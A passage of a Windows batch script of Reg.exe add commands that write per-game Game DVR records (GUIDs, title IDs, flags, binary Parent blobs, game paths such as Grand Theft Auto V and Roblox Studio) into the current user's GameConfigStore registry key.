Reg.exe add "HKCU\System\GameConfigStore\Children\326c86ae-f3a9-4980-8b9e-1da326311c76" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000005adce9ed51586046e825f8bae3d84ada217bdfa03a02782544acb89b4f07cf14000000000e80000000020000200000000d0d1c54874fba900bf7e8c3d3c697caaf75a69f2afd41654d5792dbcf61ee0640000000abce9f2877fdf8007c1b848fe0f38f5bfb2c85bdc12c6ab0b9cce2027594795a8fcfb983868aa003b0c7b45c7b1a63e872e1336d8cd15f7ef6537e8bd864ee82400000001bfb009a1cfe6551434fa53717acb6ded8b80c45543cf7a42ab404acd1e147bd9ddf6c47deab6b0219331ff10c93c98ebd5ad3e89132b2db0095466ac797f383" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\326c86ae-f3a9-4980-8b9e-1da326311c76" /v "GameDVR_GameGUID" /t REG_SZ /d "af3f11bd-4a4a-4e7f-915b-42f92384577f" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\326c86ae-f3a9-4980-8b9e-1da326311c76" /v "TitleId" /t REG_SZ /d "1698925306" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3409f26f-7bae-42a6-9c74-99c544ce5476" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3409f26f-7bae-42a6-9c74-99c544ce5476" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3409f26f-7bae-42a6-9c74-99c544ce5476" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3409f26f-7bae-42a6-9c74-99c544ce5476" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000003ff4d03d1330e9cf0d9a7b9da7817b290e7fae6386966068ed5cc0f447b4cff4000000000e8000000002000020000000251e6b7fb961c8e8203beab95528f6b2c39ce0b0ea3b38d4549fa346fb82f8903000000023aba10017424bc05fac79b28829993e7c17b5a2f8c903fb43f4d9b7f39aa4dbc295331d4de9a46ad9da580d2af5bc5b4000000073cd8d5ab4f8cafa232a49c639814452a4e4e2893fb63acdbe965b97e8b2e87be7047a2d9860ff1cd5f4804fb67555ec9781bcfea656a5f54ae6ea4aca1ca6fb" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3409f26f-7bae-42a6-9c74-99c544ce5476" /v "GameDVR_GameGUID" /t REG_SZ /d "3d991043-7128-48fd-936e-618d3e900873" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3409f26f-7bae-42a6-9c74-99c544ce5476" /v "TitleId" /t REG_SZ /d "1918679142" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37578440-a809-44bd-88fe-2f00932796b4" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37578440-a809-44bd-88fe-2f00932796b4" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37578440-a809-44bd-88fe-2f00932796b4" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37578440-a809-44bd-88fe-2f00932796b4" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000003e569115f1e219b6cb1ade76d055c775fc508ea69260a25ccc3520e8c5c0bc30000000000e8000000002000020000000c16745aa95af88753ac48c3f1f2c41fd9fee2af7d4cb17155b0b3f2b40e004e13000000043a04b70d8bc03af97ba932e2e05138851f168e4084222e1a4dabc5eb66b41425d852d358adb4ccc9b2d923b49f93f5b40000000a529c6e9e708662cc2fbea67085757904ae652ae102e184479f9654478fcec6e60eb64b73f16927ba35e41956c1e97e278bfcb26d69df0106490e246874f9022" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37578440-a809-44bd-88fe-2f00932796b4" /v "GameDVR_GameGUID" /t REG_SZ /d "44948889-a2f7-4479-a57f-918e58b10519" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37578440-a809-44bd-88fe-2f00932796b4" /v "TitleId" /t REG_SZ /d "1918679142" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37b0bb90-816e-4853-b8e4-b943541b2f03" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37b0bb90-816e-4853-b8e4-b943541b2f03" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37b0bb90-816e-4853-b8e4-b943541b2f03" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37b0bb90-816e-4853-b8e4-b943541b2f03" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000006727cd8340f88cc8db833d57d67542565dc14054fdede06121d88482246cfe56000000000e8000000002000020000000b598ddf3a6928927d0b24f37a6152b83648f341391f461c616e88ff21fb836e0200000001eb85bcb0689c029f5352964cbe327b0caaad7e185042229296dd7da3377ac934000000091bfffbe25441ef201a0061c2da071b4b0ae80bfd2ce193ee3b91eb88f0bff443a1aabf1b10bced5bc8ff7e063447685fb5e7a00977cceb51ad733db20c3575d" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37b0bb90-816e-4853-b8e4-b943541b2f03" /v "ExeParentDirectory" /t REG_SZ /d "Grand Theft Auto V" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37b0bb90-816e-4853-b8e4-b943541b2f03" /v "GameDVR_GameGUID" /t REG_SZ /d "07637478-a718-4c3b-85f1-4208550bf9ed" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\37b0bb90-816e-4853-b8e4-b943541b2f03" /v "TitleId" /t REG_SZ /d "1862446374" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3f43ed16-df66-4422-abd8-925b1350bb64" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3f43ed16-df66-4422-abd8-925b1350bb64" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3f43ed16-df66-4422-abd8-925b1350bb64" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3f43ed16-df66-4422-abd8-925b1350bb64" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000150f1ad2ab133c5e6acafd8c2531de42a18e75c280fa12a39a8f7c3d09488493000000000e8000000002000020000000da79e02a246b1cccc6449260fa0716b3730865a5c8ddd9cf1bbdaf16754130e73000000060c98c0fc321e4f820338acd13ddfb6326c5646ff36a41aaae010cf0af548833b31aa59e078a4b322dccb1cd1e00720240000000606ea71737e8d97c431b0e9bf480bfbb34e0827d4d3d8643a47c8afaa15d666b872075d36c503ffba9298dbc25b388cc66fcc3fbe1621463593164aa7865d97c" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3f43ed16-df66-4422-abd8-925b1350bb64" /v "GameDVR_GameGUID" /t REG_SZ /d "beadb662-4a97-4790-bc99-33f001c314ec" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\3f43ed16-df66-4422-abd8-925b1350bb64" /v "TitleId" /t REG_SZ /d "2119592325" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40406386-7428-4521-a6f9-2f0581086ddf" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40406386-7428-4521-a6f9-2f0581086ddf" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40406386-7428-4521-a6f9-2f0581086ddf" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40406386-7428-4521-a6f9-2f0581086ddf" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000cd7cd59665dfeea16874a88d5ad65fcc2954689392e02bd2ea0d92b5b51f0335000000000e8000000002000020000000722920510f52b5bc5eaf06280539bf46c0f7f341e32287446e8aa043c2044a6d20000000dd0c5bf79ec58f80e853f5f9e73792b9d48896ef4138a2345f3315e62fe3d7b64000000073e6da8dd74e263b9b266303bf1825154e20f3d5d2731e599ca8112e7d63f6057a54a415890ca31e9f64a707282a48f3cb5a7a05ba3052d18f65d9f454367476" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40406386-7428-4521-a6f9-2f0581086ddf" /v "GameDVR_GameGUID" /t REG_SZ /d "7cf934d6-536b-413b-84bf-519f36dc9a65" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40406386-7428-4521-a6f9-2f0581086ddf" /v "TitleId" /t REG_SZ /d "2119592325" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\405c1cab-14ed-4e85-97a8-ec71126aa2e7" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\405c1cab-14ed-4e85-97a8-ec71126aa2e7" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\405c1cab-14ed-4e85-97a8-ec71126aa2e7" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\405c1cab-14ed-4e85-97a8-ec71126aa2e7" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000006b3691f3166eb2992449c41c62750677a0ce745f9ea4b57c3887fed0a1eb1554000000000e8000000002000020000000d6fb787a1bb3f89017425fbcdeab5608aed2c477df8b20600b896ff42f9322ad2000000043f666e5377918e15335c0b163ebb2f4d30827eddf0011b6e6f4fbe6454df92940000000a9636dc842c836906fd6af8ddbf211c1e413c57f24f2d2b7f8004b0b806593721845b36c8e025d8ee9a4336fe5f0d7e31dd6ac4bb3f19272e9a95999d8d2170d" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\405c1cab-14ed-4e85-97a8-ec71126aa2e7" /v "GameDVR_GameGUID" /t REG_SZ /d "5f16f138-9b89-48cd-a1b4-935f9e07e014" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\405c1cab-14ed-4e85-97a8-ec71126aa2e7" /v "TitleId" /t REG_SZ /d "2089711717" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40aa1199-5ca0-4ee6-be13-eb5009af6889" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40aa1199-5ca0-4ee6-be13-eb5009af6889" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40aa1199-5ca0-4ee6-be13-eb5009af6889" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40aa1199-5ca0-4ee6-be13-eb5009af6889" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000e24669136e4ec3ce30126669669af8bb664d0044c03befb093853fda1926c385000000000e8000000002000020000000b786383eb05f671e603d94b4be38efd132099514f7ad5601eb63202d3958f44120000000b47a626f2f564dde2eab7810240840a24d4ba54e5b991f251740951d1b6c2c674000000051b7875f0bd1004e8cd9d87aed5cdd09828357745d0a1d35f781a17d2e176782f648ed0240e3ee473b39af2e9f7e6fb025e7920725cacbae8f1c93527b982668" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40aa1199-5ca0-4ee6-be13-eb5009af6889" /v "GameDVR_GameGUID" /t REG_SZ /d "278317db-52b0-4257-9ddd-17e942d6f851" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40aa1199-5ca0-4ee6-be13-eb5009af6889" /v "TitleId" /t REG_SZ /d "2040962988" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40e28932-7ee7-404d-b262-77693fb6f631" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40e28932-7ee7-404d-b262-77693fb6f631" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40e28932-7ee7-404d-b262-77693fb6f631" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40e28932-7ee7-404d-b262-77693fb6f631" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000009503cfca9d3af229c7db1abb2aef9697f915c80726cf5d6da014b2cfd72a2759000000000e800000000200002000000016e8d2065a5cf84c209b058efb16c592e653f5560dcad87bf2110d672b00348c300000001960cf2d94a6afd3a8fa17e8ed77eb4a3b573fed6aa49bb80d851298330eeccd98c7e0c6f292934d599e0dcd74742779400000008d5b77e4475e9374702db263201d602e2be31be23e58a8c8ab3b1c4aaf05729b09c90b732bc0f99595a60513f0c86db94a38cc8465d5312990eb79b9375927a2" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40e28932-7ee7-404d-b262-77693fb6f631" /v "GameDVR_GameGUID" /t REG_SZ /d "13a903e3-8525-4b48-b0c2-ad91ed8432be" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40e28932-7ee7-404d-b262-77693fb6f631" /v "TitleId" /t REG_SZ /d "1877036175" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\40e28932-7ee7-404d-b262-77693fb6f631" /v "MatchedExeFullPath" /t REG_SZ /d "C:\Users\pc\AppData\Local\Roblox\Versions\version-096c60fcfa5e4ca2\RobloxStudioBeta.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\43c24735-989f-477c-8ced-dc705c0a60aa" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\43c24735-989f-477c-8ced-dc705c0a60aa" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\43c24735-989f-477c-8ced-dc705c0a60aa" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\43c24735-989f-477c-8ced-dc705c0a60aa" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000003c78cef4c4a58d9b9c4a5c23b3a78269ed35a9dd1b40cb0854d9efc13cc4eb6c000000000e80000000020000200000000feb290bf86ac9839eb4fc8fdea072bf929b2ec94ed4250d9537313d20e81b0630000000973bd0f32e1568427af962be0e0357458ad35123e43aa7a5c9c46490ccddb495af57e67008a6f35666f2e322e28cff834000000049b6aa6d8fa70625eb9e85b544b7bd1524d0cf56f84d0e04d8faa5de1b5b061f83b0aae007a800d794aacdfc41c61c88e2a7962b1b77864a4c29c283c9517790" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\43c24735-989f-477c-8ced-dc705c0a60aa" /v "GameDVR_GameGUID" /t REG_SZ /d "d462329a-a831-42b3-809b-6ce39187b369" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\456db1d1-339b-4a77-8b0b-6795a1699345" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\456db1d1-339b-4a77-8b0b-6795a1699345" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\456db1d1-339b-4a77-8b0b-6795a1699345" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\456db1d1-339b-4a77-8b0b-6795a1699345" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000000d1875b75d6b6703956c461615dd90c7a7321e3ebf8d4111f2cd7f7482f84cc0000000000e8000000002000020000000029c841959994881220817cd114fe56b6c8673bf75fe022a868d4ef9dd11f5b51000000037d4e2a071532725b35f235b765a37d44000000008ac48aa6f2ddc3115963eb1e3409a1f29eae74bd1b28615100b5ca43a5e3c7aaea8452a2a2321c08e5bfc03124f45b701b0c6af5f1c03e708250289293f8c32" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\456db1d1-339b-4a77-8b0b-6795a1699345" /v "ExeParentDirectory" /t REG_SZ /d "Assetto Corsa" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\456db1d1-339b-4a77-8b0b-6795a1699345" /v "GameDVR_GameGUID" /t REG_SZ /d "ad9f3b82-3ec2-4d93-93d5-23bdbc2374ab" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\456db1d1-339b-4a77-8b0b-6795a1699345" /v "TitleId" /t REG_SZ /d "1732322725" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\46fc0979-b6fb-4de8-b90d-253cc753d244" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\46fc0979-b6fb-4de8-b90d-253cc753d244" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\46fc0979-b6fb-4de8-b90d-253cc753d244" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\46fc0979-b6fb-4de8-b90d-253cc753d244" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000d52a46f383dc691a1a0d8a21a16a059337cab58f9e4fe3b82fcdb890b674d330000000000e8000000002000020000000b9793a1f3a581404cc58a2ab8a1fbf4b5471ce05d3555350a3374bb9023c508f200000009b9e9b012e9d73ea05dac532154b718c50a6fafc1d2b3fd3d99f82dab97a184a40000000652433422f755eb1ac79d8fbd4e4bb112a305f39bf5cc29e1e96eddde222968668885a8c457197db56f999599d98f85b34d341c7d8d8db8c507626c2dc86f8c3" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\46fc0979-b6fb-4de8-b90d-253cc753d244" /v "GameDVR_GameGUID" /t REG_SZ /d "15c6ac82-6f25-4f79-8ff1-a7c777f1a7db" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\46fc0979-b6fb-4de8-b90d-253cc753d244" /v "TitleId" /t REG_SZ /d "1714452188" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\46fc0979-b6fb-4de8-b90d-253cc753d244" /v "MatchedExeFullPath" /t REG_SZ /d "E:\Spellbreak\Spellbreak\g3\Binaries\Win64\Spellbreak.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4787b2ac-d4ec-45b8-818a-bfaa6ff7daa3" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4787b2ac-d4ec-45b8-818a-bfaa6ff7daa3" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4787b2ac-d4ec-45b8-818a-bfaa6ff7daa3" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4787b2ac-d4ec-45b8-818a-bfaa6ff7daa3" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000e0cc8dca8535c1fa2aef2cc8173953f514cbeb4f0e359ef43088c4530d1af248000000000e8000000002000020000000f2e4a07a4e10f902c4530b7a9a7d12e59f7bd5adfaf5428172a9601bbea826f0200000004518395700d59104c92cde981530e1c133600197f4cc6e439bc2bfaad88efe3b400000004583aadf35fe87d01d143e4130c0a4eb889ee849e25cda7ea0076bc3eeaee9d55e86420b48e752eb35b8bc72ef936120fe758c774f05671c81d2c21232a97dc9" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4787b2ac-d4ec-45b8-818a-bfaa6ff7daa3" /v "GameDVR_GameGUID" /t REG_SZ /d "224d89df-2628-4203-bf5c-11c62dcbe9f2" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4787b2ac-d4ec-45b8-818a-bfaa6ff7daa3" /v "TitleId" /t REG_SZ /d "1667877464" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4787b2ac-d4ec-45b8-818a-bfaa6ff7daa3" /v "ProcessDependencies" /t REG_MULTI_SZ /d "audiodg.exe|1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4f561632-47cd-4c2b-93a9-e1da865f03ba" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4f561632-47cd-4c2b-93a9-e1da865f03ba" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4f561632-47cd-4c2b-93a9-e1da865f03ba" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4f561632-47cd-4c2b-93a9-e1da865f03ba" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000b6991435445b505867cdd106bb476b742f92bc755eeb634d6f2885e2b5e7efbd000000000e8000000002000020000000a46e751b690f47645666afd17e84a88f7ab4c0765929c510ac6f7f5017fcf95e30000000dd7b2cc92e57419c4e2dae72e68ecbc7982b85a9142baaa4608fe17c6b07c175d638e6bd72f20f7d7832c3c2990b2322400000004244d78b9ad62b3624678a3d999101467c25ab3d1b6d91e8e2236ca30d9b08cc928f5079c875b8c5d90bd4ea2f1321bff897c72c044b8c213e8e5f92992c254f" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4f561632-47cd-4c2b-93a9-e1da865f03ba" /v "GameDVR_GameGUID" /t REG_SZ /d "88c24bf8-d1db-48be-b6f7-684ab89c9194" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\4f561632-47cd-4c2b-93a9-e1da865f03ba" /v "TitleId" /t REG_SZ /d "1698925306" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\50ef2ba5-7013-4e09-917e-2e77e806b4d4" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\50ef2ba5-7013-4e09-917e-2e77e806b4d4" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\50ef2ba5-7013-4e09-917e-2e77e806b4d4" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\50ef2ba5-7013-4e09-917e-2e77e806b4d4" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000f713a26d358d220a63f472dc57e490304b0097aa9f1befb7c8d1c1f7ebf95cbf000000000e8000000002000020000000336049e4b7a194d18a9a4ba3a574cb4c4bd6f7c442f51e625b62cfdea584b49c30000000ca811d733df673963f08026251ccd8d0ba534d29378995cc2bbe9210809b85748cdfafe5968ba31b9da6802ef63908a040000000f7448769e6a4c6326a175fb12ad8bd9da728d52c2b366552f67c9fd5f375d24e90abd47a2ae510cc4c8374af9d33ff5efdb2b85bff28098f95180cd1c125e118" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\50ef2ba5-7013-4e09-917e-2e77e806b4d4" /v "GameDVR_GameGUID" /t REG_SZ /d "1b71cdd5-d687-414b-b729-64a8e30f9cab" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\50ef2ba5-7013-4e09-917e-2e77e806b4d4" /v "TitleId" /t REG_SZ /d "1801033410" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5bb62464-0905-4a39-b7e4-317edb6f0b33" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5bb62464-0905-4a39-b7e4-317edb6f0b33" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5bb62464-0905-4a39-b7e4-317edb6f0b33" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5bb62464-0905-4a39-b7e4-317edb6f0b33" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000b2b46af91c169e0a7897663ecda48baea3eaf1862f0579134fbee50afc2aa149000000000e800000000200002000000062de0b130e701430941da28f61e66de44d07485ffcad4a70fd9e2d79c27c4c2940000000bfe53e0e667c6b69aec5e454a4417648d1ba9c9da5d9653c0c2000a0b8275c21d0bd938bcc3202d929190c43a00312151d794a6f498d6dda6b359abbfa071d3740000000c2672ee3a991cfd9bfa2c069b50ec10d02ad25d66f7ff31dc841854a69b82a31e0455213ad8aa7f147c364c4c8e80404c5ca0bc9184fb88db240bc57008db46c" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5bb62464-0905-4a39-b7e4-317edb6f0b33" /v "GameDVR_GameGUID" /t REG_SZ /d "7eb831fc-81c0-411b-bff0-176f7cda799d" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5bb62464-0905-4a39-b7e4-317edb6f0b33" /v "TitleId" /t REG_SZ /d "2066051089" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5cdff6ad-e34e-4062-877b-3fe82e7c8949" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5cdff6ad-e34e-4062-877b-3fe82e7c8949" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5cdff6ad-e34e-4062-877b-3fe82e7c8949" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5cdff6ad-e34e-4062-877b-3fe82e7c8949" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000ee6e08927d02adccf7e231fc8d8ec9e052dae83d6e1592104b69c6fe1a40d7c4000000000e80000000020000200000008626aa0a4e3ff37e8052722568ad0364c545f54a13bc9258ed4c81059a41003a20000000b33ec80113dc881d4fce217376401d9983bad5f8a0a1865b7f818f13d9d5a0ec40000000e57cf4f483c062de537d8c48b3a43aa180c446fa55b639b2e371bda512b6928a14f605dba58f395b51df5506253c626824870df390e8ca736bb793d4e4caa116" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5cdff6ad-e34e-4062-877b-3fe82e7c8949" /v "GameDVR_GameGUID" /t REG_SZ /d "9df8835d-3764-44af-ab79-eb100bd97425" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5cdff6ad-e34e-4062-877b-3fe82e7c8949" /v "TitleId" /t REG_SZ /d "1621796646" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5d93a35e-310b-4e76-8967-b97ae66016a2" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5d93a35e-310b-4e76-8967-b97ae66016a2" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5d93a35e-310b-4e76-8967-b97ae66016a2" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5d93a35e-310b-4e76-8967-b97ae66016a2" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000828969ffbe7bfd5f26069e50671e8bb95b551c387fcad084aa15f1169f382b8f000000000e8000000002000020000000635a028ff148698750e16bd3a1496278aec9d157830fb33c67e047e0a35d48af2000000021b6e1217091b23bf6f32762d2ca16475b7180aa163dd318593dad7ded9a56324000000097d0411706c209f9e9fb7d1b995640042f86e79fb0ffcc6ae661e2a713b61078a3c49e302f6754aec5c53aec9526fabb53ddc228495821c65a36bf864264b871" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5d93a35e-310b-4e76-8967-b97ae66016a2" /v "ExeParentDirectory" /t REG_SZ /d "Assetto Corsa" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5d93a35e-310b-4e76-8967-b97ae66016a2" /v "GameDVR_GameGUID" /t REG_SZ /d "6cfa5815-25cf-4dee-b61c-ac4c88b53778" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\5d93a35e-310b-4e76-8967-b97ae66016a2" /v "TitleId" /t REG_SZ /d "1732322725" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\6053cdf7-6d52-42c8-9967-a29a542b7ae1" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\6053cdf7-6d52-42c8-9967-a29a542b7ae1" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\6053cdf7-6d52-42c8-9967-a29a542b7ae1" /v "Flags" /t REG_DWORD /d "51" /f
